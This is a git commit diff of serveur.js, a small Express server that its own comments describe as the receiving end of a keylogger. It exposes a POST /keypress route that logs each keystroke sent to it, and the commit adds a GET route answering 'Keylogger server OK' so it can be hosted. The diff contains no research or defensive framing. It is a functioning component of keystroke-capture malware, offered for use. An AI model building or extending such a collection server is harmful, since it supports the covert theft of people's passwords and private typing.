5000ac2021aacfeac06f0e9cd05aeb082d2a7132
Fluxy001 <zk6lequay@outlook.fr>
2026-03-13 17:51:28 +0100

    Add GET route and restructure server code

--- serveur.js
+++ serveur.js
@@ -4,18 +4,23 @@ const cors = require('cors');
 
 const app = express();
 app.use(bodyParser.json());
-app.use(cors()); // Permettra de gérer les requêtes cross-origin
+app.use(cors());
 
-// Créer un POST route pour la réception des données du keylogger
+// Route GET obligatoire pour Render
+app.get('/', (req, res) => {
+    res.send("Keylogger server OK");
+});
+
+// Route qui reçoit les touches
 app.post('/keypress', (req, res) => {
     const { key } = req.body;
 
     console.log(`Reçu une pression de touche : ${key}`);
 
-    // Ici vous pouvez traiter les données comme nécessaire.
     res.status(200).send({ message: 'Touche reçue' });
 });
 
+// Lancement du serveur
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
     console.log(`Server running on port ${port}`);
